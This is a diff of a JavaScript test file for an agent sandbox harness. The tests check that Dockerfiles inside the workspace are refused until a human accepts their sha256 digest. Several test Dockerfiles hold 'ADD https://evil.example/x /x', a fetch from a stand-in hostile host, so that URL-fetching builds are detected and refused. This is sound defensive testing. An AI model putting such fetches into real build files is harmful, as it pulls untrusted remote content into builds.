@@ -16,7 +16,7 @@ import { tmpdir } from "node:os";
 import { basename, dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 import {
-  BASE_IMAGE_REGISTRIES, EnvironmentError, buildArgv, buildTag, canaryFor, check, checkDockerfile, compare, composeProjects, composeServices, declared, parseProbe, probeScript, resolveImage, runningServices, tagVersion, versionMatches,
+  BASE_IMAGE_REGISTRIES, EnvironmentError, buildArgv, buildDigest, buildTag, canaryFor, check, checkDockerfile, compare, composeProjects, composeServices, declared, parseProbe, probeScript, resolveImage, runningServices, tagVersion, versionMatches,
 } from "./environment.mjs";
 import { HarnessError, imageFor, run } from "./harness.mjs";
 import { detect } from "./sandbox.mjs";
@@ -135,18 +135,55 @@ const DEV = join(DEVDIR, "devcontainer.json");
     ok("…but an ADD after the heredoc ends is judged", f(`FROM ${N}\nRUN <<EOF\necho hi\nEOF\nADD https://evil.example/x /x\n`).length === 1);
     ok("the escape directive is honoured", f("# escape=`\nFROM " + N + "\nADD `\n  https://evil.example/x `\n  /x\n").length === 1);
     ok("instruction case does not matter", f(`from ${N}\nadd https://evil.example/x /x\n`).length === 1);
-    // Through buildArgv: refused by name before any podman call, only with no build network.
+  }
+  {
+    // THE CONTROL (round 4): a Dockerfile inside the workspace is built only
+    // once a human accepted its digest. The reader above is advice printed
+    // with the refusal, never the thing that holds.
+    const N = "docker.io/library/node:22-alpine";
     const DF = join(DEVDIR, "Dockerfile");
     writeFileSync(DF, `FROM ${N}\nADD https://evil.example/x /x\n`);
-    ok("buildArgv refuses a Dockerfile that would fetch on the host, by name", code(() => buildArgv({ build: { dockerfile: "Dockerfile" } }, DEV, { workspace: PROJ })) === "BUILD_FETCHES");
-    ok("…and resolveImage never reaches podman for it", (() => {
-      let ran = false;
-      const c = code(() => resolveImage({ dev: { build: { dockerfile: "Dockerfile" } }, devcontainerPath: DEV, workspace: PROJ, exec: () => { ran = true; return { status: 0 }; } }));
-      return c === "BUILD_FETCHES" && !ran;
-    })());
-    ok("a named build network lifts it, and that run is already warned", Array.isArray(buildArgv({ build: { dockerfile: "Dockerfile" } }, DEV, { workspace: PROJ, network: "host" })));
+    const dev = { build: { dockerfile: "Dockerfile", args: { V: "1" } } };
+    const d1 = buildDigest(dev, DEV);
+    ok("a build has a sha256 digest over the Dockerfile and the build section", /^[0-9a-f]{64}$/.test(d1 ?? ""));
+    let ran = 0;
+    const exec = () => (ran++, { status: 0 });
+    let err = null;
+    try {
+      resolveImage({ dev, devcontainerPath: DEV, workspace: PROJ, exec });
+    } catch (e) {
+      err = e;
+    }
+    ok("an unaccepted workspace Dockerfile is REFUSED BY NAME before any podman call", err?.code === "BUILD_NOT_ACCEPTED" && ran === 0, String(err?.code));
+    ok("…and the refusal prints the digest to accept and what the reader found it would fetch", err?.message.includes(`--accept-build ${d1}`) && /ADD .* fetches a URL/.test(err?.message ?? ""), err?.message.slice(0, 300));
+    ok("the same Dockerfile with a different build arg is a different digest: args feed ARG, which feeds FROM", buildDigest({ build: { dockerfile: "Dockerfile", args: { V: "2" } } }, DEV) !== d1);
+    const built = resolveImage({ dev, devcontainerPath: DEV, workspace: PROJ, exec, acceptBuilds: [d1] });
+    ok("the accepted digest builds, and the run's warnings say so and repeat the reader's advice", built.built === true && ran === 1 && built.warnings.some((w) => /accepted workspace Dockerfile/.test(w) && /fetches a URL/.test(w)), JSON.stringify(built.warnings));
+    ok("a named build network does NOT stand in for acceptance", code(() => resolveImage({ dev, devcontainerPath: DEV, workspace: PROJ, exec, buildNetwork: "host" })) === "BUILD_NOT_ACCEPTED");
     writeFileSync(DF, `FROM ${N}\nCOPY stamp.txt /stamp.txt\n`);
-    ok("a clean Dockerfile builds with no network", buildArgv({ build: { dockerfile: "Dockerfile" } }, DEV, { workspace: PROJ })[2] === "none");
+    ok("editing the Dockerfile changes the digest, so the old acceptance no longer applies", code(() => resolveImage({ dev, devcontainerPath: DEV, workspace: PROJ, exec, acceptBuilds: [d1] })) === "BUILD_NOT_ACCEPTED" && buildDigest(dev, DEV) !== d1);
+    ok("…and a clean Dockerfile is still not built unaccepted: the reader's silence is advice, not proof", (() => {
+      try {
+        resolveImage({ dev, devcontainerPath: DEV, workspace: PROJ, exec });
+        return false;
+      } catch (e) {
+        return e.code === "BUILD_NOT_ACCEPTED" && /advice, not proof/.test(e.message);
+      }
+    })());
+    ok("the digest list is exact: a prefix or a different case does not accept", code(() => resolveImage({ dev, devcontainerPath: DEV, workspace: PROJ, exec, acceptBuilds: [buildDigest(dev, DEV).slice(0, 12), buildDigest(dev, DEV).toUpperCase()] })) === "BUILD_NOT_ACCEPTED");
+    // An operator-owned devcontainer outside the workspace was never the agent's.
+    const OTHER = join(TMP, "operator-env2", ".devcontainer");
+    mkdirSync(OTHER, { recursive: true });
+    writeFileSync(join(OTHER, "Dockerfile"), `FROM ${N}\n`);
+    const ODEV = join(OTHER, "devcontainer.json");
+    ok("a devcontainer outside the workspace builds with no acceptance: the agent never had it", resolveImage({ dev: { build: { dockerfile: "Dockerfile" } }, devcontainerPath: ODEV, workspace: PROJ, exec }).built === true);
+    ok("…while the same file placed inside the workspace needs one", code(() => resolveImage({ dev: { build: { dockerfile: "Dockerfile" } }, devcontainerPath: DEV, workspace: PROJ, exec })) === "BUILD_NOT_ACCEPTED");
+    ok("through the harness, the policy's acceptBuilds reaches it", (() => {
+      const d = buildDigest(dev, DEV);
+      const w = [];
+      const r = imageFor({ image: null, devcontainer: DEV, sandbox: "podman", acceptBuilds: [d] }, dev, w, { exec, workspace: PROJ });
+      return r.built === true && code(() => imageFor({ image: null, devcontainer: DEV, sandbox: "podman", acceptBuilds: [] }, dev, [], { exec, workspace: PROJ })) !== null;
+    })());
     rmSync(DF);
   }
 
